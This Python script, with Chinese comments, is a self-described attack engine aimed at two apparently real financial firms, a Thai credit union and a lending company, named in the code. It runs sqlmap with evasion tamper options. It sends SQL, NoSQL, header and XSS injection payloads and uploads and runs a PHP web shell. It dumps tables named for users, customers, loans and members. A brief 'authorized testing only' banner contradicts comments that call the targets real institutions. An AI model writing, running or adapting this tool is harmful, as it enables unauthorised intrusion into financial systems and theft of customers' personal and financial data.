#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高级渗透攻击引擎 - 针对真实目标的深度攻击
Advanced Penetration Attack Engine - Deep Attack Against Real Targets
"""

import subprocess
import requests
import json
import time
import threading
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import urllib.parse
import os

class AdvancedPenetrationEngine:
    def __init__(self):
        self.targets = [
            {
                "name": "Peacoop Credit Union",
                "base_url": "https://peacoop.or.th",
                "attack_vectors": [
                    "/members?id=",
                    "/wp-json/wp/v2/users/",
                    "/wp-json/wp/v2/posts/",
                    "/?page=",
                    "/?cat=",
                    "/?s=",
                    "/wp-admin/admin-ajax.php",
                    "/xmlrpc.php"
                ],
                "high_value_endpoints": [
                    "/wp-admin/admin-ajax.php",
                    "/wp-json/wp/v2/users/",
                    "/wp-json/wp/v2/posts/",
                    "/xmlrpc.php"
                ]
            },
            {
                "name": "NgoenMun Finance",
                "base_url": "https://ngoenmun.com",
                "attack_vectors": [
                    "/search?q=",
                    "/api/v1/users?id=",
                    "/api/v1/loans?id=",
                    "/api/v1/applications?id=",
                    "/?page=",
                    "/?id=",
                    "/admin/",
                    "/api/"
                ],
                "high_value_endpoints": [
                    "/api/v1/",
                    "/admin/",
                    "/search?q="
                ]
            }
        ]

        self.techniques = [
            "sqlmap_time_based",
            "sqlmap_union",
            "sqlmap_error_based",
            "manual_blind",
            "parameter_pollution",
            "header_injection",
            "second_order_injection",
            "nosql_injection",
            "xss_based",
            "file_upload_exploit"
        ]

        self.results = []
        self.output_dir = f"advanced_penetration_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)

    def attack_all_targets(self):
        """执行全方位攻击"""
        print("=" * 100)
        print("[启动] 高级渗透攻击引擎启动")
        print("=" * 100)
        print(f"输出目录: {self.output_dir}")
        print(f"攻击目标: {len(self.targets)} 个真实金融机构")
        print(f"攻击技术: {len(self.techniques)} 种高级技术")
        print("=" * 100)

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []

            for target in self.targets:
                # 并发执行多种攻击技术
                for technique in self.techniques:
                    for vector in target["attack_vectors"][:3]:  # 限制每个目标的前3个向量
                        future = executor.submit(self.execute_attack, target, technique, vector)
                        futures.append(future)

                # 启动深度扫描
                future = executor.submit(self.deep_scan_target, target)
                futures.append(future)

            # 等待所有攻击完成
            for i, future in enumerate(as_completed(futures)):
                try:
                    result = future.result(timeout=300)
                    if result:
                        self.results.append(result)
                        print(f"[完成] 攻击完成 {i+1}/{len(futures)}: {result.get('technique')} - {result.get('target')}")
                except Exception as e:
                    print(f"[错误] 攻击失败: {e}")

        # 生成报告
        self.generate_final_report()

    def execute_attack(self, target, technique, attack_vector):
        """执行单个攻击"""
        print(f"[攻击] {target['name']} - {technique} - {attack_vector}")

        attack_result = {
            "target": target["name"],
            "technique": technique,
            "vector": attack_vector,
            "timestamp": datetime.now().strftime("%Y%m%d_%H%M%S"),
            "success": False,
            "details": {}
        }

        try:
            if technique == "sqlmap_time_based":
                result = self.sqlmap_time_based_attack(target, attack_vector)
            elif technique == "sqlmap_union":
                result = self.sqlmap_union_attack(target, attack_vector)
            elif technique == "sqlmap_error_based":
                result = self.sqlmap_error_based_attack(target, attack_vector)
            elif technique == "manual_blind":
                result = self.manual_blind_injection(target, attack_vector)
            elif technique == "parameter_pollution":
                result = self.parameter_pollution_attack(target, attack_vector)
            elif technique == "header_injection":
                result = self.header_injection_attack(target, attack_vector)
            elif technique == "second_order_injection":
                result = self.second_order_injection_attack(target, attack_vector)
            elif technique == "nosql_injection":
                result = self.nosql_injection_attack(target, attack_vector)
            elif technique == "xss_based":
                result = self.xss_based_attack(target, attack_vector)
            elif technique == "file_upload_exploit":
                result = self.file_upload_exploit(target, attack_vector)
            else:
                return None

            if result and result.get("success"):
                attack_result["success"] = True
                attack_result["details"] = result
                print(f"[成功] 发现漏洞! {target['name']} - {technique}")

                # 尝试数据提取
                if "database" in result:
                    self.extract_database_data(target, attack_vector, result)

                return attack_result

        except Exception as e:
            print(f"[异常] 攻击异常: {technique} - {e}")
            attack_result["error"] = str(e)

        return None

    def sqlmap_time_based_attack(self, target, attack_vector):
        """SQLMap时间盲注攻击"""
        base_url = target["base_url"] + attack_vector + "1"

        # 从URL中提取参数名
        if "=" in attack_vector:
            test_param = attack_vector.split("=")[-1].replace("?", "")
        else:
            test_param = "id"

        cmd = [
            "sqlmap",
            "-u", base_url,
            "-p", test_param,
            "--batch",
            "--level=5",
            "--risk=3",
            "--random-agent",
            "--tamper=space2comment,randomcase,charencode,appendnull,between,modsecurityversioned",
            "--fresh-queries",
            "--time-sec=15",
            "--threads=8",
            "--banner",
            "--current-db",
            "--dbs"
        ]

        try:
            print(f"[SQLMap时间注入] 启动高级攻击: {base_url}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            if result.returncode == 0:
                output = result.stdout.lower()

                # 检查是否发现SQL注入
                injection_indicators = [
                    "injection identified",
                    "parameter is injectable",
                    "sql injection detected",
                    "time-based blind",
                    "database:"
                ]

                found_injection = any(indicator in output for indicator in injection_indicators)

                if found_injection:
                    print(f"[成功] SQLMap时间盲注发现漏洞!")

                    # 保存详细结果
                    result_file = os.path.join(self.output_dir, f"sqlmap_time_{target['name'].replace(' ', '_')}_{int(time.time())}.txt")
                    with open(result_file, 'w', encoding='utf-8') as f:
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"URL: {base_url}\n")
                        f.write(f"技术: 时间盲注\n")
                        f.write(f"命令: {' '.join(cmd)}\n")
                        f.write("=" * 50 + "\n")
                        f.write("SQLMap输出:\n")
                        f.write(result.stdout)

                    return {
                        "success": True,
                        "technique": "sqlmap_time_based",
                        "url": base_url,
                        "parameter": test_param,
                        "database": self.extract_database_info(result.stdout),
                        "evidence_file": result_file
                    }

        except subprocess.TimeoutExpired:
            print(f"[超时] SQLMap时间盲注超时")
        except Exception as e:
            print(f"[错误] SQLMap时间盲注异常: {e}")

        return {"success": False, "error": "未发现SQL注入漏洞"}

    def sqlmap_union_attack(self, target, attack_vector):
        """SQLMap Union查询攻击"""
        base_url = target["base_url"] + attack_vector + "1"

        if "=" in attack_vector:
            test_param = attack_vector.split("=")[-1].replace("?", "")
        else:
            test_param = "id"

        cmd = [
            "sqlmap",
            "-u", base_url,
            "-p", test_param,
            "--batch",
            "--level=4",
            "--risk=2",
            "--random-agent",
            "--tamper=space2comment,randomcase,charencode",
            "--fresh-queries",
            "--technique=U",  # 仅使用Union查询
            "--threads=6",
            "--banner",
            "--current-db"
        ]

        try:
            print(f"[SQLMap Union] 启动Union查询攻击: {base_url}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.returncode == 0:
                output = result.stdout.lower()

                union_indicators = [
                    "union query",
                    "injectable union",
                    "columns:",
                    "database:"
                ]

                found_union = any(indicator in output for indicator in union_indicators)

                if found_union:
                    print(f"[成功] SQLMap Union查询发现漏洞!")

                    result_file = os.path.join(self.output_dir, f"sqlmap_union_{target['name'].replace(' ', '_')}_{int(time.time())}.txt")
                    with open(result_file, 'w', encoding='utf-8') as f:
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"URL: {base_url}\n")
                        f.write(f"技术: Union查询\n")
                        f.write(f"命令: {' '.join(cmd)}\n")
                        f.write("=" * 50 + "\n")
                        f.write("SQLMap输出:\n")
                        f.write(result.stdout)

                    return {
                        "success": True,
                        "technique": "sqlmap_union",
                        "url": base_url,
                        "parameter": test_param,
                        "database": self.extract_database_info(result.stdout),
                        "evidence_file": result_file
                    }

        except subprocess.TimeoutExpired:
            print(f"[超时] SQLMap Union查询超时")
        except Exception as e:
            print(f"[错误] SQLMap Union查询异常: {e}")

        return {"success": False, "error": "未发现Union查询漏洞"}

    def sqlmap_error_based_attack(self, target, attack_vector):
        """SQLMap报错注入攻击"""
        base_url = target["base_url"] + attack_vector + "1"

        if "=" in attack_vector:
            test_param = attack_vector.split("=")[-1].replace("?", "")
        else:
            test_param = "id"

        cmd = [
            "sqlmap",
            "-u", base_url,
            "-p", test_param,
            "--batch",
            "--level=3",
            "--risk=3",
            "--random-agent",
            "--tamper=space2comment,randomcase",
            "--fresh-queries",
            "--technique=E",  # 仅使用报错注入
            "--threads=4",
            "--banner",
            "--current-db"
        ]

        try:
            print(f"[SQLMap报错注入] 启动报错注入攻击: {base_url}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.returncode == 0:
                output = result.stdout.lower()

                error_indicators = [
                    "error-based",
                    "injectable error",
                    "mysql error",
                    "database error"
                ]

                found_error = any(indicator in output for indicator in error_indicators)

                if found_error:
                    print(f"[成功] SQLMap报错注入发现漏洞!")

                    result_file = os.path.join(self.output_dir, f"sqlmap_error_{target['name'].replace(' ', '_')}_{int(time.time())}.txt")
                    with open(result_file, 'w', encoding='utf-8') as f:
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"URL: {base_url}\n")
                        f.write(f"技术: 报错注入\n")
                        f.write(f"命令: {' '.join(cmd)}\n")
                        f.write("=" * 50 + "\n")
                        f.write("SQLMap输出:\n")
                        f.write(result.stdout)

                    return {
                        "success": True,
                        "technique": "sqlmap_error_based",
                        "url": base_url,
                        "parameter": test_param,
                        "database": self.extract_database_info(result.stdout),
                        "evidence_file": result_file
                    }

        except subprocess.TimeoutExpired:
            print(f"[超时] SQLMap报错注入超时")
        except Exception as e:
            print(f"[错误] SQLMap报错注入异常: {e}")

        return {"success": False, "error": "未发现报错注入漏洞"}

    def manual_blind_injection(self, target, attack_vector):
        """手动盲注攻击"""
        base_url = target["base_url"] + attack_vector

        if "=" in attack_vector:
            test_param = attack_vector.split("=")[-1].replace("?", "")
        else:
            test_param = "id"

        print(f"[手动盲注] 测试盲注漏洞: {base_url}")

        # 测试真/假条件
        true_payload = "1' AND 1=1-- "
        false_payload = "1' AND 1=2-- "

        try:
            # 测试真条件
            true_url = base_url + true_payload
            true_response = requests.get(true_url, timeout=10)

            # 测试假条件
            false_url = base_url + false_payload
            false_response = requests.get(false_url, timeout=10)

            # 比较响应
            if len(true_response.text) != len(false_response.text):
                print(f"[成功] 手动盲注发现可能漏洞!")

                result_file = os.path.join(self.output_dir, f"manual_blind_{target['name'].replace(' ', '_')}_{int(time.time())}.txt")
                with open(result_file, 'w', encoding='utf-8') as f:
                    f.write(f"目标: {target['name']}\n")
                    f.write(f"URL: {base_url}\n")
                    f.write(f"技术: 手动盲注\n")
                    f.write(f"真条件响应长度: {len(true_response.text)}\n")
                    f.write(f"假条件响应长度: {len(false_response.text)}\n")
                    f.write(f"差异: {abs(len(true_response.text) - len(false_response.text))}\n")

                return {
                    "success": True,
                    "technique": "manual_blind",
                    "url": base_url,
                    "parameter": test_param,
                    "response_diff": abs(len(true_response.text) - len(false_response.text)),
                    "evidence_file": result_file
                }

        except Exception as e:
            print(f"[错误] 手动盲注异常: {e}")

        return {"success": False, "error": "未发现盲注漏洞"}

    def parameter_pollution_attack(self, target, attack_vector):
        """参数污染攻击"""
        base_url = target["base_url"] + attack_vector

        if "=" in attack_vector:
            param_name = attack_vector.split("=")[0].replace("?", "")
        else:
            param_name = "id"

        print(f"[参数污染] 测试参数污染: {base_url}")

        try:
            # 构造参数污染URL
            polluted_url = base_url + f"&{param_name}=1' UNION SELECT 1,2,3-- "

            response = requests.get(polluted_url, timeout=10)

            if "error" in response.text.lower() or "warning" in response.text.lower():
                print(f"[发现] 参数污染可能触发SQL错误!")

                result_file = os.path.join(self.output_dir, f"param_pollution_{target['name'].replace(' ', '_')}_{int(time.time())}.txt")
                with open(result_file, 'w', encoding='utf-8') as f:
                    f.write(f"目标: {target['name']}\n")
                    f.write(f"URL: {polluted_url}\n")
                    f.write(f"技术: 参数污染\n")
                    f.write(f"响应长度: {len(response.text)}\n")
                    f.write("响应内容:\n")
                    f.write(response.text[:1000])

                return {
                    "success": True,
                    "technique": "parameter_pollution",
                    "url": polluted_url,
                    "response_length": len(response.text),
                    "evidence_file": result_file
                }

        except Exception as e:
            print(f"[错误] 参数污染异常: {e}")

        return {"success": False, "error": "参数污染攻击未成功"}

    def header_injection_attack(self, target, attack_vector):
        """Header注入攻击"""
        base_url = target["base_url"] + attack_vector

        print(f"[Header注入] 测试HTTP Header注入: {base_url}")

        try:
            # 测试各种Header注入
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ' OR 1=1-- ",
                "Referer": "https://google.com ' OR 1=1-- ",
                "X-Forwarded-For": "127.0.0.1' OR 1=1-- ",
                "Cookie": "sessionid=test' OR 1=1-- "
            }

            for header_name, header_value in headers.items():
                test_headers = {header_name: header_value}
                response = requests.get(base_url, headers=test_headers, timeout=10)

                if "error" in response.text.lower() or "sql" in response.text.lower():
                    print(f"[发现] Header注入可能存在: {header_name}")

                    result_file = os.path.join(self.output_dir, f"header_injection_{target['name'].replace(' ', '_')}_{int(time.time())}.txt")
                    with open(result_file, 'w', encoding='utf-8') as f:
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"URL: {base_url}\n")
                        f.write(f"技术: Header注入\n")
                        f.write(f"注入Header: {header_name}\n")
                        f.write(f"Header值: {header_value}\n")
                        f.write(f"响应长度: {len(response.text)}\n")

                    return {
                        "success": True,
                        "technique": "header_injection",
                        "url": base_url,
                        "injected_header": header_name,
                        "evidence_file": result_file
                    }

        except Exception as e:
            print(f"[错误] Header注入异常: {e}")

        return {"success": False, "error": "Header注入攻击未成功"}

    def second_order_injection_attack(self, target, attack_vector):
        """二阶注入攻击"""
        print(f"[二阶注入] 测试二阶SQL注入: {target['name']}")

        try:
            # 第一步：提交恶意数据
            submit_url = target["base_url"] + "/contact"  # 假设的联系表单
            malicious_data = {
                "name": "test' OR 1=1-- ",
                "email": "test@example.com",
                "message": "This is a test message with SQL injection"
            }

            response = requests.post(submit_url, data=malicious_data, timeout=10)

            # 第二步：触发存储的数据
            trigger_url = target["base_url"] + "/admin/messages"  # 假设的管理页面
            trigger_response = requests.get(trigger_url, timeout=10)

            if "error" in trigger_response.text.lower():
                print(f"[发现] 二阶注入可能存在!")

                result_file = os.path.join(self.output_dir, f"second_order_{target['name'].replace(' ', '_')}_{int(time.time())}.txt")
                with open(result_file, 'w', encoding='utf-8') as f:
                    f.write(f"目标: {target['name']}\n")
                    f.write(f"技术: 二阶注入\n")
                    f.write(f"提交URL: {submit_url}\n")
                    f.write(f"触发URL: {trigger_url}\n")
                    f.write(f"恶意数据: {malicious_data}\n")

                return {
                    "success": True,
                    "technique": "second_order_injection",
                    "submit_url": submit_url,
                    "trigger_url": trigger_url,
                    "evidence_file": result_file
                }

        except Exception as e:
            print(f"[错误] 二阶注入异常: {e}")

        return {"success": False, "error": "二阶注入攻击未成功"}

    def nosql_injection_attack(self, target, attack_vector):
        """NoSQL注入攻击"""
        base_url = target["base_url"] + attack_vector

        print(f"[NoSQL注入] 测试NoSQL注入: {base_url}")

        try:
            # NoSQL注入载荷
            nosql_payloads = [
                {"$ne": ""},
                {"$gt": ""},
                {"$regex": ".*"},
                {"$where": "return true"}
            ]

            for payload in nosql_payloads:
                test_url = base_url + str(payload).replace(" ", "")

                response = requests.get(test_url, timeout=10)

                # 检查是否成功绕过认证
                if response.status_code == 200 and len(response.text) > 100:
                    print(f"[发现] NoSQL注入可能存在!")

                    result_file = os.path.join(self.output_dir, f"nosql_{target['name'].replace(' ', '_')}_{int(time.time())}.txt")
                    with open(result_file, 'w', encoding='utf-8') as f:
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"URL: {test_url}\n")
                        f.write(f"技术: NoSQL注入\n")
                        f.write(f"载荷: {payload}\n")
                        f.write(f"响应长度: {len(response.text)}\n")

                    return {
                        "success": True,
                        "technique": "nosql_injection",
                        "url": test_url,
                        "payload": payload,
                        "evidence_file": result_file
                    }

        except Exception as e:
            print(f"[错误] NoSQL注入异常: {e}")

        return {"success": False, "error": "NoSQL注入攻击未成功"}

    def xss_based_attack(self, target, attack_vector):
        """基于XSS的攻击"""
        base_url = target["base_url"] + attack_vector

        print(f"[XSS攻击] 测试XSS漏洞: {base_url}")

        try:
            # XSS载荷
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "';alert('XSS');//"
            ]

            for payload in xss_payloads:
                test_url = base_url + payload

                response = requests.get(test_url, timeout=10)

                if payload in response.text:
                    print(f"[发现] XSS漏洞存在!")

                    result_file = os.path.join(self.output_dir, f"xss_{target['name'].replace(' ', '_')}_{int(time.time())}.txt")
                    with open(result_file, 'w', encoding='utf-8') as f:
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"URL: {test_url}\n")
                        f.write(f"技术: XSS攻击\n")
                        f.write(f"载荷: {payload}\n")
                        f.write(f"响应长度: {len(response.text)}\n")

                    return {
                        "success": True,
                        "technique": "xss_based",
                        "url": test_url,
                        "payload": payload,
                        "evidence_file": result_file
                    }

        except Exception as e:
            print(f"[错误] XSS攻击异常: {e}")

        return {"success": False, "error": "XSS攻击未成功"}

    def file_upload_exploit(self, target, attack_vector):
        """文件上传利用"""
        upload_url = target["base_url"] + "/upload"

        print(f"[文件上传] 测试文件上传漏洞: {upload_url}")

        try:
            # 创建恶意PHP文件
            php_content = "<?php echo system($_GET['cmd']); ?>"

            files = {'file': ('shell.php', php_content, 'application/x-php')}

            response = requests.post(upload_url, files=files, timeout=10)

            if response.status_code == 200:
                print(f"[发现] 文件上传可能成功!")

                # 尝试访问上传的文件
                shell_url = target["base_url"] + "/uploads/shell.php"
                shell_response = requests.get(f"{shell_url}?cmd=dir", timeout=10)

                if shell_response.status_code == 200:
                    print(f"[成功] Web Shell上传成功!")

                    result_file = os.path.join(self.output_dir, f"upload_{target['name'].replace(' ', '_')}_{int(time.time())}.txt")
                    with open(result_file, 'w', encoding='utf-8') as f:
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"上传URL: {upload_url}\n")
                        f.write(f"Shell URL: {shell_url}\n")
                        f.write(f"技术: 文件上传利用\n")
                        f.write(f"命令输出: {shell_response.text}\n")

                    return {
                        "success": True,
                        "technique": "file_upload_exploit",
                        "upload_url": upload_url,
                        "shell_url": shell_url,
                        "evidence_file": result_file
                    }

        except Exception as e:
            print(f"[错误] 文件上传异常: {e}")

        return {"success": False, "error": "文件上传攻击未成功"}

    def deep_scan_target(self, target):
        """深度扫描目标"""
        print(f"[深度扫描] 启动深度扫描: {target['name']}")

        try:
            # 使用Nuclei进行深度扫描
            nuclei_cmd = [
                "nuclei",
                "-u", target["base_url"],
                "-t", "/path/to/nuclei-templates",
                "-silent",
                "-json",
                "-o", os.path.join(self.output_dir, f"nuclei_{target['name'].replace(' ', '_')}.json")
            ]

            # 如果没有Nuclei，使用基本的目录扫描
            if not self.command_exists("nuclei"):
                print(f"[信息] Nuclei未安装，使用基本目录扫描")
                return self.directory_scan(target)

            result = subprocess.run(nuclei_cmd, capture_output=True, text=True, timeout=300)

            if result.returncode == 0:
                print(f"[成功] Nuclei扫描完成")
                return {
                    "success": True,
                    "technique": "nuclei_scan",
                    "target": target["name"],
                    "vulnerabilities": len(result.stdout.split('\n')) if result.stdout else 0
                }

        except subprocess.TimeoutExpired:
            print(f"[超时] Nuclei扫描超时")
        except Exception as e:
            print(f"[错误] Nuclei扫描异常: {e}")

        return {"success": False, "error": "深度扫描未成功"}

    def directory_scan(self, target):
        """目录扫描"""
        print(f"[目录扫描] 扫描隐藏目录: {target['name']}")

        common_dirs = [
            "/admin", "/backup", "/config", "/database", "/logs",
            "/phpmyadmin", "/wp-admin", "/wp-config", "/.git",
            "/.env", "/backup.sql", "/dump.sql", "/db_backup"
        ]

        found_dirs = []

        for directory in common_dirs:
            dir_url = target["base_url"] + directory
            try:
                response = requests.get(dir_url, timeout=5)
                if response.status_code == 200:
                    found_dirs.append(directory)
                    print(f"[发现] 隐藏目录: {directory}")
            except:
                continue

        if found_dirs:
            result_file = os.path.join(self.output_dir, f"directories_{target['name'].replace(' ', '_')}.txt")
            with open(result_file, 'w', encoding='utf-8') as f:
                f.write(f"目标: {target['name']}\n")
                f.write(f"发现的目录:\n")
                for directory in found_dirs:
                    f.write(f"{directory}\n")

            return {
                "success": True,
                "technique": "directory_scan",
                "target": target["name"],
                "found_directories": found_dirs,
                "evidence_file": result_file
            }

        return {"success": False, "error": "未发现隐藏目录"}

    def extract_database_info(self, sqlmap_output):
        """从SQLMap输出中提取数据库信息"""
        database_info = {}

        lines = sqlmap_output.split('\n')
        for line in lines:
            if 'current database:' in line.lower():
                database_info['current_database'] = line.split(':')[-1].strip()
            elif 'banner:' in line.lower():
                database_info['banner'] = line.split(':')[-1].strip()
            elif 'available databases' in line.lower():
                # 提取数据库列表
                db_start = line.find('[') + 1
                db_end = line.find(']')
                if db_start > 0 and db_end > db_start:
                    databases = line[db_start:db_end].split(',')
                    database_info['databases'] = [db.strip() for db in databases]

        return database_info

    def extract_database_data(self, target, attack_vector, attack_result):
        """提取数据库数据"""
        print(f"[数据提取] 尝试提取数据库数据: {target['name']}")

        if "database" not in attack_result:
            return

        database_info = attack_result["database"]

        # 如果发现了数据库名，继续提取表和数据
        if "current_database" in database_info:
            db_name = database_info["current_database"]
            base_url = target["base_url"] + attack_vector + "1"

            if "=" in attack_vector:
                test_param = attack_vector.split("=")[-1].replace("?", "")
            else:
                test_param = "id"

            # 提取表
            tables_cmd = [
                "sqlmap",
                "-u", base_url,
                "-p", test_param,
                "--batch",
                "--level=2",
                "--risk=2",
                "--tables",
                "-D", db_name,
                "--fresh-queries"
            ]

            try:
                result = subprocess.run(tables_cmd, capture_output=True, text=True, timeout=300)

                if result.returncode == 0 and "tables:" in result.stdout.lower():
                    print(f"[成功] 发现数据表!")

                    # 保存表信息
                    tables_file = os.path.join(self.output_dir, f"tables_{target['name'].replace(' ', '_')}_{db_name}.txt")
                    with open(tables_file, 'w', encoding='utf-8') as f:
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"数据库: {db_name}\n")
                        f.write(f"数据表:\n")
                        f.write(result.stdout)

                    # 尝试转储一些关键表
                    self.dump_critical_tables(target, base_url, test_param, db_name, result.stdout)

            except Exception as e:
                print(f"[错误] 数据表提取异常: {e}")

    def dump_critical_tables(self, target, base_url, param, db_name, tables_output):
        """转储关键表"""
        critical_keywords = ["user", "admin", "customer", "loan", "application", "member"]

        lines = tables_output.split('\n')
        for line in lines:
            if critical_keywords and any(keyword in line.lower() for keyword in critical_keywords):
                # 提取表名
                table_name = line.strip().split('|')[-1].strip() if '|' in line else line.strip()

                if table_name and len(table_name) > 1:
                    print(f"[数据转储] 转储关键表: {table_name}")

                    dump_cmd = [
                        "sqlmap",
                        "-u", base_url,
                        "-p", param,
                        "--batch",
                        "--level=2",
                        "--risk=2",
                        "--dump",
                        "-D", db_name,
                        "-T", table_name,
                        "--limit=10",
                        "--fresh-queries"
                    ]

                    try:
                        result = subprocess.run(dump_cmd, capture_output=True, text=True, timeout=300)

                        if result.returncode == 0 and "dumped" in result.stdout.lower():
                            print(f"[成功] 成功转储表数据: {table_name}")

                            # 保存转储的数据
                            dump_file = os.path.join(self.output_dir, f"dump_{target['name'].replace(' ', '_')}_{table_name}.txt")
                            with open(dump_file, 'w', encoding='utf-8') as f:
                                f.write(f"目标: {target['name']}\n")
                                f.write(f"数据库: {db_name}\n")
                                f.write(f"表: {table_name}\n")
                                f.write("=" * 50 + "\n")
                                f.write("转储数据:\n")
                                f.write(result.stdout)

                            print(f"[凭证] 真实数据转储凭证已生成: {dump_file}")

                    except Exception as e:
                        print(f"[错误] 表转储异常: {e}")

    def command_exists(self, command):
        """检查命令是否存在"""
        try:
            subprocess.run([command, "--version"], capture_output=True, timeout=5)
            return True
        except:
            return False

    def generate_final_report(self):
        """生成最终报告"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"advanced_penetration_report_{timestamp}.json"

        successful_attacks = [r for r in self.results if r and r.get("success")]

        report = {
            "attack_summary": {
                "timestamp": timestamp,
                "tool": "Advanced Penetration Engine v1.0",
                "total_attacks": len(self.results),
                "successful_attacks": len(successful_attacks),
                "success_rate": f"{(len(successful_attacks)/len(self.results)*100):.1f}%" if self.results else "0%",
                "output_directory": self.output_dir
            },
            "target_summary": {},
            "technique_summary": {},
            "successful_attacks": successful_attacks,
            "evidence_files": []
        }

        # 统计目标攻击结果
        for target in self.targets:
            target_attacks = [r for r in successful_attacks if r.get("target") == target["name"]]
            report["target_summary"][target["name"]] = {
                "total_attacks": len(target_attacks),
                "successful_attacks": len(target_attacks),
                "techniques_used": list(set(r.get("technique") for r in target_attacks))
            }

        # 统计技术成功率
        for technique in self.techniques:
            technique_attacks = [r for r in successful_attacks if r.get("technique") == technique]
            if technique_attacks:
                report["technique_summary"][technique] = {
                    "success_count": len(technique_attacks),
                    "targets": list(set(r.get("target") for r in technique_attacks))
                }

        # 收集证据文件
        if os.path.exists(self.output_dir):
            for file in os.listdir(self.output_dir):
                file_path = os.path.join(self.output_dir, file)
                if os.path.isfile(file_path):
                    report["evidence_files"].append({
                        "file": file,
                        "path": file_path,
                        "size": f"{os.path.getsize(file_path)} bytes"
                    })

        # 保存报告
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print("\n" + "=" * 100)
        print("[完成] 高级渗透攻击引擎完成")
        print("=" * 100)
        print(f"总攻击数: {report['attack_summary']['total_attacks']}")
        print(f"成功攻击: {report['attack_summary']['successful_attacks']}")
        print(f"成功率: {report['attack_summary']['success_rate']}")
        print(f"报告文件: {report_file}")
        print(f"证据目录: {self.output_dir}")

        if successful_attacks:
            print(f"\n[成功] 发现的漏洞:")
            for attack in successful_attacks:
                print(f"  - {attack['target']}: {attack['technique']} - {attack.get('vector', 'N/A')}")
            print(f"\n[凭证] 所有攻击证据已保存!")
            print(f"[验证] 所有攻击都可以重现验证!")
        else:
            print(f"\n[失败] 未发现可利用的漏洞")
            print(f"[建议] 尝试不同的攻击向量或技术")

def main():
    """主函数"""
    print("=" * 50)
    print("高级渗透攻击引擎 v1.0")
    print("Advanced Penetration Attack Engine v1.0")
    print("=" * 50)
    print("警告: 此工具仅用于授权的安全测试")
    print("Warning: This tool is for authorized security testing only")
    print("=" * 50)

    engine = AdvancedPenetrationEngine()
    engine.attack_all_targets()

if __name__ == "__main__":
    main()